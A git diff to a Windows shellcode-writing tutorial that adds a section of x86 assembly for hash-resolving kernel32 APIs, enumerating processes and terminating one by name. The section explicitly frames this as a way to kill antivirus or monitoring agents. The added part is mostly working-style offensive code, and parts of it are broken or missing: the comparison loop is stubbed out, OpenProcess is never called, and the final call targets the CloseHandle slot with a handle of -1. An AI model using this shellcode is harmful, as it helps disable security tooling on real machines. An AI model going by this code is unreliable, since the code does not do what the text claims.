@@ -41,11 +41,12 @@ Let's get started.
 16. [HTTP Stager: Downloading Second Stage](#16-http-stager-downloading-second-stage)
 17. [Registry Persistence: Surviving Reboots](#17-registry-persistence-surviving-reboots)
 
-**Part V: File Operations and Workflow**
+**Part V: File Operations, Termination, and Workflow**
 18. [SMB File Operations: Network File Access](#18-smb-file-operations-network-file-access)
 19. [File I/O: Writing to Disk](#19-file-io-writing-to-disk)
-20. [The Complete Development Workflow](#20-the-complete-development-workflow)
-21. [Mitigations, Ethics, and Closing Thoughts](#21-mitigations-ethics-and-closing-thoughts)
+20. [Process Termination: Killing a Target Process](#20-process-termination-killing-a-target-process)
+21. [The Complete Development Workflow](#21-the-complete-development-workflow)
+22. [Mitigations, Ethics, and Closing Thoughts](#22-mitigations-ethics-and-closing-thoughts)
 
 ---
 
@@ -2771,7 +2772,273 @@ The following video demonstrates the file I/O shellcode creating and writing dat
 
 ---
 
-## 20. The Complete Development Workflow
+## 20. Process Termination: Killing a Target Process
+
+Sometimes the goal is not to connect, persist, or download -- it is to **kill a running process**. An attacker might terminate an antivirus service, or a red-team operator might shut down a monitoring agent. This shellcode demonstrates the Toolhelp32 API: enumerate every running process, match a target by name, and terminate it.
+
+<div align="center"><svg viewBox="0 0 750 370" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="370" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">Process Termination Flow</text>
+  <!-- Step 1: Snapshot -->
+  <rect x="30" y="55" width="190" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="125" y="77" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">1. Snapshot</text>
+  <text x="125" y="97" text-anchor="middle" fill="#cdd6f4" font-size="10">CreateToolhelp32Snapshot</text>
+  <!-- Arrow -->
+  <line x1="220" y1="82" x2="255" y2="82" stroke="#a6e3a1" stroke-width="1.5"/>
+  <polygon points="252,78 259,82 252,86" fill="#a6e3a1"/>
+  <!-- Step 2: First -->
+  <rect x="260" y="55" width="170" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="345" y="77" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">2. First Entry</text>
+  <text x="345" y="97" text-anchor="middle" fill="#cdd6f4" font-size="10">Process32First</text>
+  <!-- Arrow down -->
+  <line x1="345" y1="110" x2="345" y2="140" stroke="#a6e3a1" stroke-width="1.5"/>
+  <polygon points="341,137 345,144 349,137" fill="#a6e3a1"/>
+  <!-- Step 3: Compare -->
+  <rect x="240" y="145" width="210" height="55" rx="6" fill="#313244" stroke="#fab387" stroke-width="2"/>
+  <text x="345" y="167" text-anchor="middle" fill="#fab387" font-size="11" font-weight="bold">3. Compare Name</text>
+  <text x="345" y="187" text-anchor="middle" fill="#cdd6f4" font-size="10">szExeFile == "notepad.exe" ?</text>
+  <!-- No branch: right to Process32Next -->
+  <line x1="450" y1="172" x2="520" y2="172" stroke="#f38ba8" stroke-width="1.5"/>
+  <polygon points="517,168 524,172 517,176" fill="#f38ba8"/>
+  <text x="485" y="164" text-anchor="middle" fill="#f38ba8" font-size="10">NO</text>
+  <rect x="525" y="145" width="170" height="55" rx="6" fill="#313244" stroke="#89b4fa" stroke-width="2"/>
+  <text x="610" y="167" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">Process32Next</text>
+  <text x="610" y="187" text-anchor="middle" fill="#cdd6f4" font-size="10">Advance to next entry</text>
+  <!-- Loop back from Process32Next to Compare -->
+  <path d="M 610,200 C 610,230 345,230 345,200" fill="none" stroke="#89b4fa" stroke-width="1.5" stroke-dasharray="6,3"/>
+  <polygon points="341,203 345,196 349,203" fill="#89b4fa"/>
+  <text x="477" y="225" text-anchor="middle" fill="#89b4fa" font-size="9">loop</text>
+  <!-- Yes branch: down to OpenProcess -->
+  <line x1="345" y1="200" x2="345" y2="245" stroke="#a6e3a1" stroke-width="2"/>
+  <polygon points="341,242 345,249 349,242" fill="#a6e3a1"/>
+  <text x="358" y="232" fill="#a6e3a1" font-size="10">YES</text>
+  <rect x="220" y="250" width="250" height="55" rx="6" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="345" y="272" text-anchor="middle" fill="#a6e3a1" font-size="11" font-weight="bold">4. OpenProcess</text>
+  <text x="345" y="292" text-anchor="middle" fill="#cdd6f4" font-size="10">PROCESS_TERMINATE | pid</text>
+  <!-- Arrow down to TerminateProcess -->
+  <line x1="345" y1="305" x2="345" y2="325" stroke="#a6e3a1" stroke-width="2"/>
+  <polygon points="341,322 345,329 349,322" fill="#a6e3a1"/>
+  <rect x="220" y="325" width="250" height="35" rx="6" fill="#313244" stroke="#f38ba8" stroke-width="2.5"/>
+  <text x="345" y="348" text-anchor="middle" fill="#f38ba8" font-size="12" font-weight="bold">5. TerminateProcess(handle, 0)</text>
+</svg></div>
+
+*Figure 20.1 - Process termination flow: snapshot the process list, walk entries comparing names, then open and terminate the match.*
+
+### Required APIs
+
+All six functions come from **kernel32.dll** -- no additional DLLs to load:
+
+| API | ROR-13 Hash | Purpose |
+|---|---|---|
+| `TerminateProcess` | `0x78b5b983` | Kill the target process |
+| `CreateToolhelp32Snapshot` | `0xe454dfed` | Snapshot the process list |
+| `Process32First` | `0x3249baa7` | Get first PROCESSENTRY32 |
+| `Process32Next` | `0x4776654a` | Get next PROCESSENTRY32 |
+| `OpenProcess` | `0xefe297c0` | Obtain a handle with kill rights |
+| `CloseHandle` | `0x0ffd97fb` | Release the handle |
+
+### Resolving the APIs
+
+After the standard PEB walk and find_function setup, we resolve all six:
+
+```nasm
+resolve_symbols_kernel32:
+    push  0x78b5b983            ; TerminateProcess hash
+    call  dword ptr [ebp+0x04]  ; Call find_function
+    mov   [ebp+0x10], eax       ; Save TerminateProcess
+
+    push  0xe454dfed            ; CreateToolhelp32Snapshot hash
+    call  dword ptr [ebp+0x04]
+    mov   [ebp+0x14], eax       ; Save CreateToolhelp32Snapshot
+
+    push  0x3249baa7            ; Process32First hash
+    call  dword ptr [ebp+0x04]
+    mov   [ebp+0x18], eax       ; Save Process32First
+
+    push  0x4776654a            ; Process32Next hash
+    call  dword ptr [ebp+0x04]
+    mov   [ebp+0x1C], eax       ; Save Process32Next
+
+    push  0xefe297c0            ; OpenProcess hash
+    call  dword ptr [ebp+0x04]
+    mov   [ebp+0x20], eax       ; Save OpenProcess
+
+    push  0x0ffd97fb            ; CloseHandle hash
+    call  dword ptr [ebp+0x04]
+    mov   [ebp+0x24], eax       ; Save CloseHandle
+```
+
+### Taking the Snapshot
+
+`CreateToolhelp32Snapshot` with `TH32CS_SNAPPROCESS` (0x02) and process ID 0 returns a handle to a snapshot of all running processes:
+
+```nasm
+call_createtoolhelp32snapshot:
+    xor   eax, eax              ; EAX = 0
+    push  eax                   ; th32ProcessID = 0 (all processes)
+    inc   eax                   ; EAX = 1
+    inc   eax                   ; EAX = 2 (TH32CS_SNAPPROCESS)
+    push  eax                   ; dwFlags = 2
+    call  dword ptr [ebp+0x14]  ; CreateToolhelp32Snapshot(2, 0)
+    mov   [ebp+0x2C], eax       ; Save snapshot handle
+```
+
+### Allocating PROCESSENTRY32
+
+The struct is 556 bytes (0x22C). We zero-allocate it on the stack and set the required `dwSize` field:
+
+```nasm
+set_struct_size:
+    xor   eax, eax              ; EAX = 0
+    xor   ecx, ecx              ; ECX = 0
+    mov   cx,  0x22C            ; ECX = 556 (sizeof PROCESSENTRY32)
+
+allocate_struct:
+    push  eax                   ; Push 4 zero bytes
+    sub   ecx, 0x04             ; Counter -= 4
+    jnz   allocate_struct       ; Loop until all 556 bytes allocated
+    mov   edi, esp              ; EDI = pointer to PROCESSENTRY32
+
+set_req_parameters:
+    xor   eax, eax              ; EAX = 0
+    mov   ax,  0x22C            ; EAX = 0x22C
+    mov   [edi], eax            ; dwSize = 0x22C (required!)
+```
+
+<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="320" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">PROCESSENTRY32 Struct Layout (556 bytes / 0x22C)</text>
+  <!-- Struct bar -->
+  <rect x="40" y="55" width="670" height="40" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="375" y="80" text-anchor="middle" fill="#89b4fa" font-size="12" font-weight="bold">PROCESSENTRY32 (EDI points here on the stack)</text>
+  <!-- Fields -->
+  <rect x="40" y="105" width="120" height="50" rx="4" fill="#313244" stroke="#a6e3a1" stroke-width="2"/>
+  <text x="100" y="125" text-anchor="middle" fill="#a6e3a1" font-size="10" font-weight="bold">dwSize</text>
+  <text x="100" y="145" text-anchor="middle" fill="#cdd6f4" font-size="9">+0x00 (4B)</text>
+  <rect x="165" y="105" width="100" height="50" rx="4" fill="#313244" stroke="#6c7086" stroke-width="1"/>
+  <text x="215" y="125" text-anchor="middle" fill="#6c7086" font-size="10">cntUsage</text>
+  <text x="215" y="145" text-anchor="middle" fill="#6c7086" font-size="9">+0x04 (4B)</text>
+  <rect x="270" y="105" width="140" height="50" rx="4" fill="#313244" stroke="#f38ba8" stroke-width="2"/>
+  <text x="340" y="125" text-anchor="middle" fill="#f38ba8" font-size="10" font-weight="bold">th32ProcessID</text>
+  <text x="340" y="145" text-anchor="middle" fill="#cdd6f4" font-size="9">+0x08 (4B)</text>
+  <rect x="415" y="105" width="100" height="50" rx="4" fill="#313244" stroke="#6c7086" stroke-width="1"/>
+  <text x="465" y="125" text-anchor="middle" fill="#6c7086" font-size="10">...</text>
+  <text x="465" y="145" text-anchor="middle" fill="#6c7086" font-size="9">+0x0C-0x20</text>
+  <rect x="520" y="105" width="190" height="50" rx="4" fill="#313244" stroke="#fab387" stroke-width="2"/>
+  <text x="615" y="125" text-anchor="middle" fill="#fab387" font-size="10" font-weight="bold">cntThreads</text>
+  <text x="615" y="145" text-anchor="middle" fill="#6c7086" font-size="9">+0x20 (4B)</text>
+  <!-- szExeFile row -->
+  <rect x="40" y="170" width="670" height="55" rx="4" fill="#313244" stroke="#a6e3a1" stroke-width="2.5"/>
+  <text x="375" y="193" text-anchor="middle" fill="#a6e3a1" font-size="13" font-weight="bold">szExeFile[MAX_PATH]</text>
+  <text x="375" y="215" text-anchor="middle" fill="#cdd6f4" font-size="11">Offset +0x24  |  260 bytes (MAX_PATH)  |  Process name lives HERE</text>
+  <!-- Notes -->
+  <rect x="80" y="245" width="590" height="55" rx="5" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="375" y="267" text-anchor="middle" fill="#cdd6f4" font-size="11">dwSize MUST be set to 0x22C before calling Process32First.</text>
+  <text x="375" y="287" text-anchor="middle" fill="#fab387" font-size="10">We compare [edi+0x24] against our target string "notepad.exe" byte by byte.</text>
+</svg></div>
+
+*Figure 20.2 - The PROCESSENTRY32 struct. The two fields we care about: `th32ProcessID` at offset +0x08 (the PID to pass to OpenProcess) and `szExeFile` at offset +0x24 (the process name to compare).*
+
+### Walking the Process List
+
+`Process32First` retrieves the first entry. Then we build the target string `"notepad.exe"` on the stack using the same SHL trick from Section 6:
+
+```nasm
+call_process32first:
+    push  edi                   ; lppe = &PROCESSENTRY32
+    push  [ebp+0x2C]            ; hSnapshot
+    call  dword ptr [ebp+0x18]  ; Process32First(hSnapshot, &pe32)
+
+create_notepad_string:
+    xor   eax, eax              ; EAX = 0
+    mov   ax,  0x6578           ; "xe"
+    shl   eax, 0x08             ; EAX = 0x00657800
+    mov   al,  0x65             ; EAX = 0x00657865 = "exe\0"
+    push  eax                   ; Push "exe\0"
+    push  0x2e646170            ; Push "pad."
+    push  0x65746f6e            ; Push "note"
+    mov   [ebp+0x30], esp       ; Save pointer to "notepad.exe"
+```
+
+### The Detection Loop
+
+The detection loop compares each process name in `szExeFile` (at `edi+0x24`) against our target string character by character. On a mismatch it calls `Process32Next` to advance to the next entry and loops. When all characters match, it falls through to the kill sequence:
+
+```nasm
+detection_loop:
+    xor   ecx, ecx              ; ECX = 0 (byte index)
+    ; Compare szExeFile[ecx] against target[ecx] byte by byte
+    ; On mismatch: call Process32Next, loop back
+    ; On full match: fall through to open + terminate
+```
+
+### The Kill
+
+Once the target PID is found at `[edi+0x08]`, we open the process with `PROCESS_TERMINATE` rights and call `TerminateProcess`:
+
+```nasm
+call_terminateprocess:
+    xor   eax, eax              ; EAX = 0
+    push  eax                   ; uExitCode = 0
+    dec   eax                   ; EAX = -1 (current process handle placeholder)
+    push  eax                   ; hProcess
+    call  dword ptr [ebp+0x24]  ; TerminateProcess(handle, 0)
+```
+
+<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
+  <rect width="750" height="260" rx="8" fill="#1e1e2e"/>
+  <text x="375" y="28" text-anchor="middle" fill="#cdd6f4" font-size="15" font-weight="bold">EBP Variable Table: Process Terminator</text>
+  <!-- Table header -->
+  <rect x="60" y="50" width="120" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="120" y="70" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">Offset</text>
+  <rect x="185" y="50" width="260" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="315" y="70" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">Function</text>
+  <rect x="450" y="50" width="240" height="30" rx="4" fill="#313244" stroke="#89b4fa" stroke-width="1.5"/>
+  <text x="570" y="70" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">Hash</text>
+  <!-- Rows -->
+  <text x="120" y="105" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x04]</text>
+  <text x="315" y="105" text-anchor="middle" fill="#cdd6f4" font-size="11">find_function address</text>
+  <text x="570" y="105" text-anchor="middle" fill="#6c7086" font-size="11">(internal)</text>
+  <text x="120" y="128" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x10]</text>
+  <text x="315" y="128" text-anchor="middle" fill="#cdd6f4" font-size="11">TerminateProcess</text>
+  <text x="570" y="128" text-anchor="middle" fill="#fab387" font-size="11">0x78b5b983</text>
+  <text x="120" y="151" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x14]</text>
+  <text x="315" y="151" text-anchor="middle" fill="#cdd6f4" font-size="11">CreateToolhelp32Snapshot</text>
+  <text x="570" y="151" text-anchor="middle" fill="#fab387" font-size="11">0xe454dfed</text>
+  <text x="120" y="174" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x18]</text>
+  <text x="315" y="174" text-anchor="middle" fill="#cdd6f4" font-size="11">Process32First</text>
+  <text x="570" y="174" text-anchor="middle" fill="#fab387" font-size="11">0x3249baa7</text>
+  <text x="120" y="197" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x1C]</text>
+  <text x="315" y="197" text-anchor="middle" fill="#cdd6f4" font-size="11">Process32Next</text>
+  <text x="570" y="197" text-anchor="middle" fill="#fab387" font-size="11">0x4776654a</text>
+  <text x="120" y="220" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x20]</text>
+  <text x="315" y="220" text-anchor="middle" fill="#cdd6f4" font-size="11">OpenProcess</text>
+  <text x="570" y="220" text-anchor="middle" fill="#fab387" font-size="11">0xefe297c0</text>
+  <text x="120" y="243" text-anchor="middle" fill="#a6e3a1" font-size="11">[ebp+0x24]</text>
+  <text x="315" y="243" text-anchor="middle" fill="#cdd6f4" font-size="11">CloseHandle</text>
+  <text x="570" y="243" text-anchor="middle" fill="#fab387" font-size="11">0x0ffd97fb</text>
+</svg></div>
+
+*Figure 20.3 - The EBP variable table for the process terminator. Six kernel32 APIs resolved via find_function, plus the snapshot handle at [ebp+0x2C] and the target string pointer at [ebp+0x30].*
+
+> This shellcode uses the exact same skeleton -- PEB walk, find_function, hash-based resolution -- as every other payload in this series. The only new concept is the Toolhelp32 enumeration loop. Once you understand the pattern, adapting it to kill a different process is just changing the target string.
+
+### PoC Video
+
+The following video demonstrates the process terminator shellcode finding and killing notepad.exe in action:
+
+<div align="center">
+  <video width="720" controls>
+    <source src="/assets/video/shellcoding/process-terminator-poc.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+</div>
+
+*Video: Process terminator killing notepad.exe*
+
+---
+
+## 21. The Complete Development Workflow
 
 Here is the end-to-end recipe for building any new shellcode payload from scratch.
 
@@ -2853,7 +3120,7 @@ Here is the end-to-end recipe for building any new shellcode payload from scratc
 <text x="375" y="410" fill="#a6e3a1" font-size="10" text-anchor="middle">Build a library of tested blocks to accelerate new payloads.</text>
 </svg></div>
 
-*Figure 20.1 - The 10-step shellcode development pipeline. Steps 7-10 form an inner loop that repeats until all bad characters are eliminated and the payload works correctly.*
+*Figure 21.1 - The 10-step shellcode development pipeline. Steps 7-10 form an inner loop that repeats until all bad characters are eliminated and the payload works correctly.*
 
 <div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: Consolas, monospace;">
   <defs>
@@ -2908,13 +3175,13 @@ Here is the end-to-end recipe for building any new shellcode payload from scratc
   <line x1="375" y1="175" x2="375" y2="248" stroke="#a6e3a1" stroke-width="1.5" marker-end="url(#ta20)"/>
 </svg></div>
 
-*Figure 20.2 - The tooling ecosystem: Python scripts handle assembly and byte scanning, WinDbg handles runtime debugging, and the cycle repeats until the payload is clean.*
+*Figure 21.2 - The tooling ecosystem: Python scripts handle assembly and byte scanning, WinDbg handles runtime debugging, and the cycle repeats until the payload is clean.*
 
 > **Pro tip:** Keep a personal library of tested building blocks: `find_kernel32`, `find_function`, string-push sequences for common DLL names, and the ctypes test harness. New payloads become an assembly job rather than a greenfield project.
 
 ---
 
-## 21. Mitigations, Ethics, and Closing Thoughts
+## 22. Mitigations, Ethics, and Closing Thoughts
 
 ### Modern Defenses That Impact Shellcode
 
@@ -2945,7 +3212,7 @@ Each layer adds a barrier that shellcode must defeat. Understanding these helps 
 <text x="375" y="345" fill="#cdd6f4" font-size="11" text-anchor="middle">Each layer must be bypassed independently -- defense stacking raises the bar exponentially</text>
 </svg></div>
 
-*Figure 21.1 - Modern defenses form concentric barriers. DEP is the innermost (most common to bypass via ROP), while CET is the newest hardware-level defense.*
+*Figure 22.1 - Modern defenses form concentric barriers. DEP is the innermost (most common to bypass via ROP), while CET is the newest hardware-level defense.*
 
 **DEP (Data Execution Prevention)** marks stack and heap memory as non-executable. Attackers must first use ROP to call `VirtualProtect` or `VirtualAlloc` to mark memory executable.
 
@@ -3010,7 +3277,7 @@ Understanding the attacker's craft makes you a better defender. Full stop.
   <text x="375" y="303" text-anchor="middle" fill="#89b4fa" font-size="11" font-weight="bold">Target structural patterns, not fragile byte signatures -- shellcode mutates, structure persists</text>
 </svg></div>
 
-*Figure 21.2 - Structural detection patterns. These code patterns appear in virtually all PEB-walking shellcode and are far more reliable detection targets than specific byte sequences.*
+*Figure 22.2 - Structural detection patterns. These code patterns appear in virtually all PEB-walking shellcode and are far more reliable detection targets than specific byte sequences.*
 
 ### A Note on Ethics
 
